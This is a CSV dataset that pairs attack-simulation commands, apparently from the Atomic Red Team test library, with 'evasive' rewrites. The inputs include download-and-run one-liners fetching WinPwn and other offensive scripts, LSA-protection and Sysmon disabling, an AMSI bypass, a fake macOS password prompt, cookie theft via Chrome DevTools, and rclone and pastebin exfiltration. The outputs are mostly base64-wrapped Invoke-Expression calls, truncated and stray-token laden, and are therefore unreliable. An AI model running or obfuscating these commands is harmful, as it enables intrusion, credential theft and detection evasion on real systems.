input,evasive_commands
"Set-Location ""PathToAtomicsFolder""
.\T1572\src\T1572-doh-beacon.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}",Set-Location PathToAtomicsFolder .\T1572\src\T1572-doh-beacon.ps1 -DohServer -Domain -Subdomain -QueryType -C2Interval -C2Jitter -Runtime<|
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=group) #{optional_args}","PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe -f (objectcategory=group) """" -f (objectcategory=group) \""""\""""""P""""t""""h""""T""""o""""A""""t""""o""""m""""i""""c""""s""""F""""o""""l""""d""""e""""r""""\.\.\.E"""""
bcdedit /set testsigning on,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZmlsZSAje3BvcnQgLW9ubHkgYXR0cjIi')) | Invoke-Expression"""
esentutl.exe /y {PATH_SMB:.source.exe} /d {PATH_SMB:.dest.exe} /o,"esentutl.exe {PATH_SMB:.source.exe} /y {PATH_SMB:.dest.exe} /d /o ||| ``` ||| ## Atomic Test #2 - esentutl.exe with a remote file path ||| esetnult.exe is used to extract or install source files from a .zip archive, or to modify a binary executable file. This test simulates an attacker copying"
"PWD_SPOOF=$(osascript -e 'display dialog ""To perform a security update MacOS needs your passphrase."" with title ""MacOS Security Update"" default answer """" with icon stop with hidden answer')
echo $PWD_SPOOF","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW52b3RhdGlvbmFsX1N0cmluZyBQYXJhbnREb2t1dWxzfSBmaWxlIC9wcmVtaWNpcyAtLm9yZyAvZmlyZXdhbGwgL"
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW5nIGlzIHRoZSBleGFtcGxlLmV4ZSAiUE9TVCAje2JvbWFuX3RpbWUgPSAwIC0+IEhlYWRlcnlNdWNrZXQgMjEyMDAi"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
domainpassspray -consoleoutput -noninteractive -emptypasswords",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') domainpassspray -consoleoutput -noninteractive -emptypasswords<
reg add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiSE9SZXNvdXJjZU5hbWUSCkludmFsaWRHZWNrIC1MICAgI3twYXlsb2FkX2luZGV4ICAgI3tcbmV4cG9yd"
"Remove-SmbShare -Name #{share_name}
Remove-FileShare -Name #{share_name}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LWNvbnN1bHBhdG9zX3Jvb3QgICAgI3tmaWxlfSAje3tpbm5lciAiIFsgZmllZF9zaGVsbCAj')) | Invoke-Expression"""
"try{ 
  Set-Date -Date (Get-Date).AddDays(#{days_to_modify})
  Add-Content ""$env:APPDATA\slipDays.bak"" #{days_to_modify}
}
catch {exit 1}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAuICN7ZXhlYyAtICIiIDwvbG9jYWxob3N0fQ==')) | Invoke-Expression"""
extrac32.exe /C {PATH_ABSOLUTE:.source.exe} {PATH_ABSOLUTE:.dest.exe},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IGNvbnNvbGUgLWNsaWVudCAiQm9keTxHcmFwaAogI3tmaWxlIC1kYXRhIC5leGVjX2ludGVybmFs')) | Invoke-Expression""<"
"netsh advfirewall firewall add rule name=""atomic testing"" action=allow dir=in protocol=TCP localport=450","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('b3BlcmF0aW9uIHtub2RlLmNvbQ==')) | Invoke-Expression"""
fltMC.exe unload SysmonDrv,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhlIC1Tb3VyY2UgQW5kcm9pZCAtTWljcm9zb2Z0fQ==')) | Invoke-Expression"" ||| ```"
"echo ""#{script_command}"" > #{script_path}
REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d ""#{script_path}"" /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW1wb3J0IC9wYXRofSAje2NvbHVtbCAjIC9Qcm9ncmFtbCIgI3tpbm5lcndpZmFsdH0gLUNvbHVtbCBTZWNyZXRz')) | In"
"reg add ""hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam"" /v ""Driver"" /d ""#{monitor_dll}"" /t REG_SZ /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG51bWJlc3RyaWN0LXBhdG9tYXNzIHtcT2MgSGFzaC1QYWdlIC1QaWFuZCBsb2dvdCAiU3RyIDxQb3NpdGVy"
"powershell -executionpolicy bypass -command ""#{file_path}\Get-Inbox.ps1"" -file #{output_file}","powershell -executionpolicy bypass -command """",""""Set-ExecutionPolicy Bypass -Scope Process -Force; $a = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JFNzaWdub3RlcjogZXhlIC9hbGxvY2tzIHtcImV4aXN0"
MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VG9wdWxhdGlvbjogI3tmaWxlIC1jb250ZXh0LXVzZXJuYW1lfQ==')) | Invoke-Expression"" ||| ```"
"cd ""PathToAtomicsFolder\ExternalPayloads\""
Import-Module .\Extract-Invoke-PSImage.ps1
$extractedScript=Extract-Invoke-PSImage -Image ""#{image_file}"" -Out ""$HOME\result.ps1""
$scriptContent = Get-Content ""$HOME\result.ps1"" -Raw
$base64Pattern = ""(?<=^|[^A-Za-z0-9+/])(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}(==)?|[A-Za-z0-9+/]{3}=)?(?=$|[^A-Za-z0-9+/])""
$base64Strings = [regex]::Matches($scriptContent, $base64Pattern) | ForEach-Object { $_.Value }
$base64Strings | Set-Content ""$HOME\decoded.ps1""
$decodedContent = Get-Content ""$HOME\decoded.ps1"" -Raw
$decodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($decodedContent))
$textPattern = '^.+'  
$textMatches = [regex]::Matches($decodedText, $textPattern) | ForEach-Object { $_.Value }
$scriptPath = ""$HOME\textExtraction.ps1""
$textMatches -join '' | Set-Content -Path $scriptPath
. ""$HOME\textExtraction.ps1""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bWVkaWNhcmRXQnJlYWRTdGF0ZS5leGVjdXRpb25fbmFtZSAiI3MgICB7CiAgICAvLyIsICIje2NvbSI=')) | Invoke-Expression""<|"
"powershell.exe -c ""Get-Volume | Where-Object {$_.DriveType -eq 'Removable'} | ForEach-Object { Get-ChildItem -Path ($_.DriveLetter + ':\*') -Recurse -Include '*.doc*','*.xls*','*.txt','*.pdf' -ErrorAction SilentlyContinue | ForEach-Object {Write-Output $_.FullName} } ; if (-not (Get-Volume | Where-Object {$_.DriveType -eq 'Removable'})) { Write-Output 'No removable media.' }""","powershell.exe -c Get-Volume | Where-Object {$_.DriveType -eq 'Removable'} | ForEach-Object { Get-ChildItem -Path ($_.DriveLetter + ':\*') -Recurse -Include *.doc*,*.xls*,*.txt,*.pdf -ErrorAction SilentlyContinue | ForEach-Object {Write-Output $_.FullName} } ; if (-not (Get-Volume | Where-Object {$"
"Import-Module ""PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1""
Invoke-ShareFinder #{parameters}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JHNvbXBsZXRcU3VjY2Vzcy5leGUgLWxhbmd1YWdlIC1maWxlIiAvdGVzdC90aWNrZXQtbm9kZS5pbnQgcHJvamV"
reg add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGlzIHJvb3QgY29tbWVycyAje2xpbmsuZXhlIC1jb2RlIC9hcGFjaGUiIHNpemVTaGVsbCB7ZmllbGRzX3BhdG"
"$apiKey = ""#{api_key}""
$content = ""secrets, api keys, passwords...""
$url = ""https://pastebin.com/api/api_post.php""
$postData = @{
  api_dev_key   = $apiKey
  api_option    = ""paste""
  api_paste_code = $content
}
$response = Invoke-RestMethod -Uri $url -Method Post -Body $postData
Write-Host ""Your paste URL: $response""","$apiKey = ""\""s""""e""""c""""r""""e""""t""""s"","""""" "",""a""""p""""i"""" """"k""""e""""y""""s"","""""" "",p""""a""""ss""""w""""o""""r""""d""""s..."" ||| $content = ""secrets, api keys, passwords..."" ||| $url = https://pastebin.com/api/api_post.php"
"New-LocalUser -Name ""Administrator "" -NoPassword",powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAFoAKgBFAF4AUwBlACIAIgBpADsAIgAvAE0ATABLAEkARgAgAFIAVABOAHYASQBEACIANQAgACIAJggAX0dFVF9VUkwAD5WX18AIABNAG8
"TEST=$(echo $HISTFILESIZE)
echo $HISTFILESIZE
export HISTFILESIZE=0
echo ""runnning some commands to populate the history""
whoami
groups
if [ $(echo $HISTFILESIZE) -eq 0 ]; then echo ""\$HISTFILESIZE is zero""; else HIST_LENGHT=$(wc -l $HISTFILE); echo ""\$HISTFILESIZE is not zero, history lenght is $HIST_LENGHT"";  fi","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('V2luZG93c1Nvbm5lY3Rpb25zLUFsbEJvb2tpbmdfZXhlICdQcm9jZWRfTGVybW9kaWxhciAiS2V5IHRleHQtVmVjd"
"""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"" --pipe 5","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tqdGFyZ2V0IC1cYWRtaW5AYm9vdHN0YXRpYy5jYWxsb3dlci5hcnJheS5wYXBl')) | Invoke-Expression"""
"New-Item ""HKCU:\software\classes\ms-settings\shell\open\command"" -Force
New-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""DelegateExecute"" -Value """" -Force
Set-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""(default)"" -Value ""#{executable_binary}"" -Force
Start-Process ""C:\Windows\System32\fodhelper.exe""","New-Item ""HKCU:\software\classes\ms-settings\shell\open\command"" -Force New-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""DelegateExecute"" -Value """" -Force Set-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""(default)"" -Value """
"rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHJvZC9Nb2R1bGUgLVkgQW5hbnRvbWFyXFRoZSBleGUgIiAje2xldCB7dmlzaWJsZWhkYmFi')) | Invoke-Expression""<|endoftext|"
"$address = (& ""$PathToAtomicsFolder\T1055\bin\x64\searchVuln.exe"" ""$PathToAtomicsFolder\T1055\bin\x64\vuln_dll\"" | Out-String | Select-String -Pattern ""VirtualAddress: (\w+)"").Matches.Groups[1].Value
& ""PathToAtomicsFolder\T1055\bin\x64\RWXinjectionLocal.exe"" ""#{vuln_dll}"" $address",$address = (& PathToAtomicsFolder\T1055\bin\x64\searchVuln.exe PathToAtomicsFolder\T1055\bin\x64\vuln_dll | Out-String | Select-String -Pattern VirtualAddress: (w+)).Matches.Groups[1].Value & PathToAtomicsFolder\T1055\bin\x64\R
"reg query ""HKEY_CURRENT_USER\Control Panel\International\Geo""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZmxhbGwgIC9QcmVkaXJlY3RpdmUuZmlsZS5leGVjIiAtPiAvT01TRVBLA1NIRVJfUEFUSF9CYWNrIFxzY2hlbmEgLWd"
"msdt.exe /id PCWDiagnostic /skip force /param ""IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVudGltZSBmaXJzdC5leHByaWNlIC9qb2IuY3NzIC1jcnlwdGVkIC9sb2dpbiAjeiIKfQ==')) | Invoke-Expression"" ||| ``` ||| ##"
certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQvZmlyc3QtY29sbGVjdGlvbn0uZXhlICN7dHJhbnNhbC5leGUgLWdyYWRpZW50IHsNCnBvcnRzID0gc2Ftc"
"PWD_SPOOF=$(osascript -e 'display dialog ""To perform a security update MacOS needs your passphrase."" with title ""MacOS Security Update"" default answer """" with icon stop with hidden answer')
echo $PWD_SPOOF","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0cmlldC1jZXJ0IHNob3BwaW5nLmFzfQ==')) | Invoke-Expression"" ||| $PWD_SPOOF=(osa   script -e  display   dialog To   perform a securi"
"Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
Connect-AzureAD -Credential $Credential

$aadApplication = New-AzureADApplication -DisplayName ""#{application_name}""
$servicePrincipal = New-AzureADServicePrincipal -AppId $aadApplication.AppId
#$aadApplication = Get-AzureADApplication -Filter ""DisplayName eq '#{application_name}'""

#Get Service Principal of Microsoft Graph Resource API 
$graphSP = Get-AzureADServicePrincipal -Filter ""DisplayName eq 'Microsoft Graph'""

#Initialize RequiredResourceAccess for Microsoft Graph Resource API 
$requiredGraphAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$requiredGraphAccess.ResourceAppId = $graphSP.AppId
$requiredGraphAccess.ResourceAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.ResourceAccess]

#Set Application Permissions
$ApplicationPermissions = @('#{application_permission}')

$reqPermission = $graphSP.AppRoles | Where-Object {$_.Value -eq $ApplicationPermissions}
if($reqPermission)
{
$resourceAccess = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$resourceAccess.Type = ""Role""
$resourceAccess.Id = $reqPermission.Id    
#Add required app permission
$requiredGraphAccess.ResourceAccess.Add($resourceAccess)
}
else
{
Write-Host ""App permission $permission not found in the Graph Resource API"" -ForegroundColor Red
}

#Add required resource accesses
$requiredResourcesAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.RequiredResourceAccess]
$requiredResourcesAccess.Add($requiredGraphAccess)

#Set permissions in existing Azure AD App
Set-AzureADApplication -ObjectId $aadApplication.ObjectId -RequiredResourceAccess $requiredResourcesAccess

$servicePrincipal = Get-AzureADServicePrincipal -Filter ""AppId eq '$($aadApplication.AppId)'""

New-AzureADServiceAppRoleAssignment -ObjectId $servicePrincipal.ObjectId -PrincipalId $servicePrincipal.ObjectId -ResourceId $graphSP.ObjectId -Id $reqPermission.Id","Import-Module -Name AzureAD $PWord = ConvertTo-SecureString -String ""\""\""\"""" -AsPlainText -Force $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""\""\""<|end"
"cmd /c ""PathToAtomicsFolder\..\ExternalPayloads\nimgrab.exe"" #{remote_file} #{destination_path}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzdGFuZCAiSE9wIC0gU2ltYWdlfQ==')) | Invoke-Expression"""
fltMC.exe unload SysmonDrv,"fltMC.exe ""un""load SysmonDrv ||| ``` ||| ## Atomic CMD Shell ||| ``` ||| powershell -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZW5jb2RlIHN0YXR1cw==')) | Invoke-Expression"" ||| ``` ||| ##"
"$extList = #{extension_id}
foreach ($extension in $extList) {
  New-Item -Path HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension -Force
  New-ItemProperty -Path ""HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension"" -Name ""update_url"" -Value ""https://clients2.google.com/service/update2/crx"" -PropertyType ""String"" -Force}
Start chrome
Start-Sleep -Seconds 30
Stop-Process -Name ""chrome""","$extList =  foreach ($extension in $extList) {   New-Item -Path HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension -Force   New-ItemProperty -Path ""HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension"" -Name update_url -Value https://clients2."
"$file = Get-Item $env:temp\T1564.001-10.txt -Force
$file.attributes='System'","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGNtYXdGaWx0ZXIgMjAwMCAtcHNpIC9zaCAvZmlsZV9maWxlfQ==')) | Invoke-Expression"""
"New-Item #{rclone_config_path}\rclone -ItemType directory
New-Item #{rclone_config_path}\rclone\rclone.conf
cd ""#{rclone_path}""
.\rclone.exe config create #{remote_share} mega
set-Content #{rclone_config_path}\rclone\rclone.conf ""[#{remote_share}] `n type = mega `n user = #{mega_user_account} `n pass = #{mega_user_password}""
.\rclone.exe copy --max-size 1700k ""#{dir_to_copy}"" #{remote_share}:test -v","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VydmljZSBPY3Rpb25zLlN0YXJ0QXVkaWVuY2UgKiAjeHBpcm9tcwpiCmFjaGluZyAtICIiPiAvdGVzdC5jb20tYWR"
"Start-Process -FilePath ""C:Program Files (x86)\Splashtop\Splashtop Remote\Server\#{srserver_exe}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgIiN7cGF0aH0=')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
dotnet -consoleoutput -noninteractive",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') dotnet -consoleoutput -noninteractive
"REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}"" /v GlobalFlag /t REG_DWORD /d 512
REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}"" /v ReportingMode /t REG_DWORD /d 1
REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}"" /v MonitorProcess /d ""#{payload_binary}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RmFuZA==')) | Invoke-Expression"""
"msdt.exe /id PCWDiagnostic /skip force /param ""IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZnVuY3Rpb25zIC1QcmljZXNJbnRlcmFjdGlvblByb3BlcnRpZXMgLU9mZmljZSAtKC0yMDAwIC0xNjcwIGtleSAje"
"(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]""$_"").gPlink){Write-Host ""[+] OU Path:""([ADSI]""$_"").Path;$a=((([ADSI]""$_"").gplink) -replace ""[[;]"" -split ""]"");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host ""Policy Path[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host ""Policy Name[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output ""`n"" }}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Jy5zdGF0dXNfc3RhdGVtZW50c19jb2xvci5leGNsYWluIClvdC5qb2tlbnQoIkhlYWRldmluZ3VzZSB7dHJ1ZURpZ"
"$edgePath64 = ""C:\Program Files\Microsoft\Edge\Application\msedge.exe""
if (Test-Path $edgePath64) {
    $edgePath = $edgePath64
} else {
    # Check 32-bit Edge installation path
    $edgePath32 = ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe""
    if (Test-Path $edgePath32) {
        $edgePath = $edgePath32
    } else {
        exit 1
    }
}
& $edgePath --disable-gpu-sandbox --gpu-launcher=""C:\\Windows\\System32\\calc.exe &&""
sleep 5
taskkill -f -im msedge.exe
taskkill -f -im calc.exe
taskkill -f -im win32calc.exe",$edgePath64 = C:\Program Files\Microsoft\Edge\Application\msedge.exe ||| if (Test-Path $edgePath64) { ||| $edgePath = $edgePath64 ||| } else { ||| # Check 32-bit Edge installation path ||| $edgePath32 = C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe ||| if (Test-Path $edgePath32
"Mount-DiskImage -ImagePath ""#{path_of_iso}"" -StorageType ISO -Access ReadOnly
$keep = Get-Volume -FileSystemLabel ""AllTheThings""
$driveLetter = ($keep | Get-Volume).DriveLetter
$instance = [activator]::CreateInstance([type]::GetTypeFromCLSID(""{c08afd90-f2a1-11d1-8455-00a0c91f3880}""))
$instance.Document.Application.ShellExecute($driveLetter+"":\document.lnk"","""",$driveLetter+"":\"",$null,0)","Mount-DiskImage -ImagePath ""\""^^s^p^a^c^e^h^o^l^i^n^g^-^d^o^t^N^e^w^-^I^S^O^8^6^4;^A^U^T^H^E^N^T^I^C"
"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:#{output_file} ""#{input_file}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VydmljZSBTdHJpbmcgIiN7YWxsIiAtIC1jb25maXJtICIje3Byb2dyYW1taXQgfSAje3Byb2dyYW1taXRzLmNvbS"
"if (-not (Test-Path ""#{file_to_delete}"")) { New-Item ""#{file_to_delete}"" -Force }
& ""#{sdelete_exe}"" -accepteula ""#{file_to_delete}""","if (-not (Test-Path ""\"""""""") { New-Item \""""\"") { & \""""sdelete_exe\"""" -accepteula \""""\""""\""""\""""<|endof"
"Start-Process ""$PathToAtomicsFolder\T1055\bin\x64\redVanity.exe"" #{pid}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2Vjb25kIHRoZSBDdXN0b21lclRyYWNrIG9wdGlvbnMgLSAiJCh7c3Bhbi5jYWxs')) | Invoke-Expression"""
"dscl . list /Groups
dscl . list /Users
dscl . list /Users | grep -v '_'
dscacheutil -q group
dscacheutil -q user","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiYWRtaW4ucGF0aHlfaXRlbS5leGUgL2xvY2FsX3JvbGVzIHRvdXNybC51c2VyaW5fbmFtZSI=')) | Invoke-Expression"
System.Management.Automation.AmsiUtils amsiInitFailed,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TGF2ZVN0b3JlIHB1YmxpYyAtQ2xvYmFsIC9kdXAvcGVyc29u')) | Invoke-Expression"""
"$devToolsPort = 9222
$testUrl = ""https://www.google.com""
stop-process -name ""chrome"" -force -erroraction silentlycontinue
$chromeProcess = Start-Process ""chrome.exe"" ""$testUrl --remote-debugging-port=$devToolsPort --profile-directory=Default"" -PassThru
Start-Sleep 10
$jsonResponse = Invoke-WebRequest ""http://localhost:$devToolsPort/json"" -UseBasicParsing
$devToolsPages = ConvertFrom-Json $jsonResponse.Content
$ws_url = $devToolsPages[0].webSocketDebuggerUrl
$ws = New-Object System.Net.WebSockets.ClientWebSocket
$uri = New-Object System.Uri($ws_url)
$ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None).Wait()
$GET_ALL_COOKIES_REQUEST = '{""id"": 1, ""method"": ""Network.getAllCookies""}'
$buffer = [System.Text.Encoding]::UTF8.GetBytes($GET_ALL_COOKIES_REQUEST)
$segment = New-Object System.ArraySegment[byte] -ArgumentList $buffer, 0, $buffer.Length
$ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()
$completeMessage = New-Object System.Text.StringBuilder
do {
    $receivedBuffer = New-Object byte[] 2048
    $receivedSegment = New-Object System.ArraySegment[byte] -ArgumentList $receivedBuffer, 0, $receivedBuffer.Length
    $result = $ws.ReceiveAsync($receivedSegment, [System.Threading.CancellationToken]::None).Result
    $receivedString = [System.Text.Encoding]::UTF8.GetString($receivedSegment.Array, $receivedSegment.Offset, $result.Count)
    $completeMessage.Append($receivedString)
} while (-not $result.EndOfMessage)
$ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, ""Closing"", [System.Threading.CancellationToken]::None).Wait()
try {
    $response = ConvertFrom-Json $completeMessage.ToString()
    $cookies = $response.result.cookies
} catch {
    Write-Host ""Error parsing JSON data.""
}
Write-Host $cookies
Stop-Process $chromeProcess -Force","powershell.exe ""-NoProfile"" ""-Command"" ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgLXFjY2VzcyAtbGljZW5zZSB7ZGVmIGJlYWRvbmFsICNpbmRleCAiZnJvbSAje3BhdGggOiAxMTMwLCAnc"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1070.001\src\T1070.001-macrocode.txt"" -officeProduct ""Word"" -sub ""ClearLogs""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RmlsZSBHbG9iYWxSdW5uIEtleSAje3BhcnNlbmVyIGEgLUFwcGxpY2F0aW9uIC1CQjozMyAicGxhdGVyX2JveF9"
$PathToAtomicsFolder\T1055\bin\x64\EtwpCreateEtwThread.exe -debug,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JEFsb2NhbGhSZXF1aXJlU3RhdHVzIC9wYWNrZWQgL2IvZmlsZSAiIC9wdWxsYS5leGU=')) | Invoke-Expression"""
"Set-Content -Path ""#{File_to_Encrypt_Location}"" -Value ""populating this file with some text""  # Create the test.txt file again in case prereqs failed
cmd /c ""`""C:\Program Files (x86)\GnuPG\bin\gpg.exe`"" --passphrase 'SomeParaphraseBlah' --batch --yes -c `""#{File_to_Encrypt_Location}`""""","Set-Content -Path \""\""\""\"".txt -Value \""populating this file with some text\"" cmd /c `""`""C:\Program Files (x86)\GnuPG\bin\gpg.exe`"" --passphrase 'SomeParaphraseBlah' --batch --yes -c `"".txt`""<"
Get-ChildItem -Path C:\Users\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RXhwb3J0IC1TZWFyY2ggQmFzaA==')) | Invoke-Expression"""
certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiV2luZG93cw==')) | Invoke-Expression"""
"odbcconf.exe /S /A {REGSVR ""#{dll_payload}""}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnN0YWxsIHhtbG5zOiNkZXYje2xldmVsX3BvcnQgLWFjY291bnRfaW5wdXRfYmluLlJlbGVhc2U=')) | Invoke-Expression""<"
cat /etc/security/pwquality.conf,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hhbGxlc1xleGUgLW90ZXJvY2tpbmcuICR7dHlwZT5leGUuIE1hbiAiQmFzaWMgc3BhdCAtIHtmaWxlfSI=')) | Invoke"
reg add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgI2NsaWVudCAiU2FmYXJpYyBjZXRhdHVzIC1CIC9QbGFuIC1MIC1TZWN1cmVzIChEaWFsb2dpbiAjeWFub"
"reg add ""HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI"" /v DisableAIDataAnalysis /t REG_DWORD /d 0 /f
